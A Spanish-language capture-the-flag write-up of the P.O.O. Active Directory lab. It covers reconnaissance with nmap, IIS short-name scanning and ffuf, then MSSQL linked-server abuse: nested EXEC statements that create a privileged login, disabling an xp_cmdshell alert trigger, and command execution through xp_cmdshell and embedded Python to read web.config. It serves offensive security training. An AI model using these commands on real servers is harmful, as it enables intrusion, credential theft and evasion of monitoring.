
---

## 🚩 Laboratorio: Professional Offensive Operations (P.O.O.)

**Autores:** eks y mrb3n

**Punto de Entrada:** `10.13.38.11`

**Dificultad:** Nivel 1 (Red Team Operator)

### 📝 Introducción y Escenario

**Professional Offensive Operations (P.O.O.)** es una organización en ascenso dentro del sector de la ciberseguridad que recientemente ha migrado sus servicios críticos a un clúster de última generación. Este entorno cuenta con hardware y software de vanguardia, diseñado específicamente para simular un escenario moderno de **Active Directory (AD)**.

Este laboratorio está orientado a poner a prueba las capacidades técnicas de un operador en un entorno controlado pero actualizado, utilizando las tecnologías y sistemas operativos más recientes.

### 🎯 Objetivos Principales

El ejercicio sigue una cadena de ataque completa (Kill Chain) con los siguientes hitos:

1. **Acceso Inicial:** Comprometer el host perimetral expuesto.
    
2. **Escalada de Privilegios:** Elevar privilegios de manera local en los sistemas comprometidos.
    
3. **Movimiento Lateral:** Desplazarse a través de la red interna del clúster.
    
4. **Dominio Total:** Comprometer el controlador de dominio y obtener el control absoluto del entorno.
    
5. **Recolección de Banderas (CTF):** Capturar las banderas (flags) distribuidas en el proceso.
    

### 🛠️ Áreas de Enfoque Técnico

El laboratorio expone a los participantes a las siguientes disciplinas fundamentales de las operaciones ofensivas:

- **Reconocimiento y Enumeración:** Identificación de servicios, usuarios y vectores de ataque, incluyendo aplicaciones web.
    
- **Ataques a Aplicaciones Web:** Explotación de vulnerabilidades en el front-end para ganar acceso inicial.
    
- **Active Directory Hacking:** Técnicas de enumeración y explotación específicas de entornos Windows Domain.
    
- **Movimiento Lateral y Escalada:** Técnicas para navegar por la red y obtener mayores niveles de acceso en los hosts.
    
- **Conocimiento Situacional:** Capacidad de entender el entorno comprometido para tomar decisiones tácticas precisas.
### Recon

El comando **nmap** es el primer paso fundamental en cualquier auditoría porque realiza el **reconocimiento** del objetivo. Su función es mapear la superficie de ataque, identificando qué puertos están abiertos y qué servicios (como servidores web o bases de datos) están corriendo, permitiéndote encontrar debilidades específicas antes de intentar cualquier explotación.

```coffeescript
nmap -p80,1433 -sCV 10.13.38.11
```

![[Captura de pantalla 2026-04-20 103814.png]]


### Análisis de Resultados: Enumeración Inicial (Nmap)

El escaneo de puertos sobre el objetivo `10.13.38.11` revela una superficie de ataque basada íntegramente en tecnología **Microsoft**, confirmando la presencia de un entorno **Active Directory** bajo el dominio `POO`.

---

#### 1. Servicios Identificados

| **Puerto**   | **Estado** | **Servicio** | **Versión / Detalle**                      |
| ------------ | ---------- | ------------ | ------------------------------------------ |
| **80/tcp**   | Abierto    | HTTP         | **Microsoft IIS 10.0**                     |
| **1433/tcp** | Abierto    | ms-sql-s     | **Microsoft SQL Server 2017** (14.00.2056) |

---

#### 2. Hallazgos Críticos de Enumeración

- **Infraestructura Web:** El servidor utiliza **IIS 10.0**, lo que indica un sistema operativo Windows Server moderno. Se detectó el método `TRACE` activo, lo que sugiere una configuración por defecto que podría ser aprovechada para ataques de tipo _Cross-Site Tracing_ (XST).
    
- **Base de Datos (MSSQL):** La instancia de SQL Server está en su versión inicial (RTM), sin Service Packs aplicados. Esto aumenta la probabilidad de existencia de vulnerabilidades conocidas si el sistema no ha sido endurecido manualmente.
    
- **Información de Dominio y Host:** Los scripts de Nmap extrajeron datos de NetBIOS, lo que permite mapear la red interna:
    
    - **Nombre del Equipo:** `COMPATIBILITY`
        
    - **Nombre del Dominio:** `POO`
        
    - **Nombre NetBIOS:** `POO`


![[Pasted image 20260420151512.png]]

![[Pasted image 20260420152111.png]]

![[Pasted image 20260420153005.png|697]]

![[Pasted image 20260420153106.png|697]]

```c
java -jar iis_shortname_scanner.jar 2 20 http://10.13.38.11/
```


![[Pasted image 20260420195226.png]]

![[Pasted image 20260420195456.png]]


```c
/home/kali/IIS-ShortName-Scanner/release && echo "n" | java -jar iis_shortname_scanner.jar 2 20 http://10.13.38.11/dev/
```

![[Pasted image 20260420201603.png]]


```c
cd /home/kali/IIS-ShortName-Scanner/release && echo "n" | java -jar iis_shortname_scanner.jar 2 20 http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db/
```

![[Pasted image 20260420211457.png]]

```c
grep '^co.*' /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt > fuzz_co.txt

ffuf -w fuzz_co.txt -u http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db/poo_FUZZ.txt -mc 200
```


  ![[Pasted image 20260420213223.png]]

![[Pasted image 20260420213544.png]]

### 1. Los 31 caracteres (El "Límite del Texto")

Como bien dices, ver 31 caracteres en un mundo de hashes es sospechoso. Casi todos los identificadores de este tipo (como MD5) son hexadecimales de 128 bits, lo que equivale a **32 caracteres**.

- **La "Bandera Roja":** En informática, los datos suelen ser potencias de 2 (8, 16, 32, 64). Un nombre de 31 caracteres es "asimétrico".
    
- **La Realidad:** El comando `strings` busca secuencias de caracteres imprimibles. Si el carácter número 32 es un `1`, pero el byte que le sigue es un `00` (Nulo) o un carácter de control no imprimible, `strings` a veces se confunde y corta la cadena justo antes, pensando que lo que sigue ya no es texto.
    

### 2. ¿Por qué `strings` falló? (Binario vs. Texto)

El archivo `.DS_Store` no es un `.txt`; es un archivo tipo **B-tree** propietario de Apple.

- **Estructura:** Los nombres no están guardados como "Palabra + Espacio", sino como **"Longitud + Nombre + Metadatos"**.
    
- **El Error:** Si el archivo dice "El nombre mide 32 caracteres", pero el carácter 32 es un valor bajo en la tabla ASCII o está pegado a un código de fin de registro, `strings` lo ignora. Por eso, en auditorías forenses, se prefiere usar un **Editor Hexadecimal** (como `hexedit` o `ghex`) para ver el byte real al final de la cadena.
    

### 3. La Tilde (~1) vs. El Uno Real (1)

Esta es la parte donde la mayoría se pierde, pero la lógica es distinta para cada sistema:

#### El Nombre Corto (Legacy de Windows 8.3)

Es una **etiqueta generada**. Windows toma los primeros 6 caracteres del nombre largo y le añade `~1`.

- **Original:** `304c0c90fbc6520610abbf378e2339d1`
    
- **Corto:** `304C0C~1` (El `~1` **NO** es parte del nombre original, es un alias para que sistemas viejos lo entiendan).
    

#### El Nombre Largo (El verdadero)

Es el **valor real**. El `1` al final de `...39d1` es un carácter legítimo del nombre del archivo o carpeta.

- Si el archivo se llamara `...39d2`, el nombre corto seguiría siendo `304C0C~1` (si es el primero que empieza así), pero el nombre largo terminaría en `2`.
    

---

### Resumen para tu documentación:

| **Concepto**             | **Característica** | **Propósito**                                                   |
| ------------------------ | ------------------ | --------------------------------------------------------------- |
| **Hash (32 chars)**      | Fijo y completo    | Identificador único de la carpeta.                              |
| **`strings`**            | Herramienta básica | Filtra solo lo que "parece" texto; puede perder el último byte. |
| **Tilde (`~1`)**         | Sintético          | Un puntero de Windows para compatibilidad.                      |
| **Carácter Final (`1`)** | Auténtico          | Parte esencial de la ruta para acceder al recurso.              |


### Explotación y Movimiento Lateral

Llegando a esta parte, noté algo raro con los servidores vinculados (Linked Servers). Me puse a jugar con comandos `EXEC` anidados para ver si colaba, y logré forzar la creación de un usuario con privilegios en la instancia de SQL Server:

![[Pasted image 20260420220928.png]]
![[Pasted image 20260420223032.png]]
![[Pasted image 20260420224118.png]]

```sql
EXEC ('EXEC (''EXEC sp_addlogin ''''super'''', ''''abc123!'''' '') at [COMPATIBILITY\POO_PUBLIC]') at [COMPATIBILITY\POO_CONFIG];
```

![[Pasted image 20260420224420.png]]

Ya con acceso privilegiado, tocaba ir a buscar la primera flag. Le tiré un par de consultas directas para listar las tablas del esquema y luego sacar el contenido:

```sql
-- Enumerando tablas para encontrar la flag
EXEC ('EXEC (''select table_name, table_schema from flag.INFORMATION_SCHEMA.TABLES'') at [COMPATIBILITY\POO_PUBLIC]') at [COMPATIBILITY\POO_CONFIG];

-- Dump de la tabla objetivo
EXEC ('EXEC (''select * from flag.dbo.flag'') at [COMPATIBILITY\POO_PUBLIC]') at [COMPATIBILITY\POO_CONFIG];
```

![[Pasted image 20260420233916.png]]

---

### Evasión y RCE

![[Pasted image 20260421022834.png]]

Acá se puso interesante. Para lograr la ejecución de código (RCE) sin que me tiren la conexión, tuve que bajar algunos escudos de la base de datos. Había triggers molestando, así que los deshabilité antes de usar `xp_cmdshell` y tirar código usando Python embebido. 

Así quedó la secuencia:

```sql
-- Viendo qué triggers andaban activos
select name from sys.server_triggers;

-- Tumbando la alerta que vigila xp_cmdshell
disable trigger ALERT_xp_cmdshell on all server;

-- Tocando permisos del config web
xp_cmdshell icacls C:\inetpub\wwwroot\web.config

-- Tirando comandos al sistema directamente con Python
EXEC sp_execute_external_script @language = N'Python', @script = N'import os; os.system("whoami");';
EXEC sp_execute_external_script @language = N'Python', @script = N'import os; os.system("type C:\inetpub\wwwroot\web.config");';
```

---

### Foothold Final
Ya casi cerrando esta fase, aseguré persistencia y tiré un `netstat` rápido para entender cómo estaba el mapeo de red interno y ver hacia dónde pivotar luego:

```sql
EXEC sp_execute_external_script @language = N'Python', @script = N'import os; os.system("netstat -anop tcp");';
```

![[Pasted image 20260421023751.png]]
![[Pasted image 20260421024023.png]]
![[Pasted image 20260421030221.png]]

Y listo, con estos permisos ya tenía vía libre para seguir escalando en el dominio.

![[Captura de pantalla 2026-04-24 104049.png]]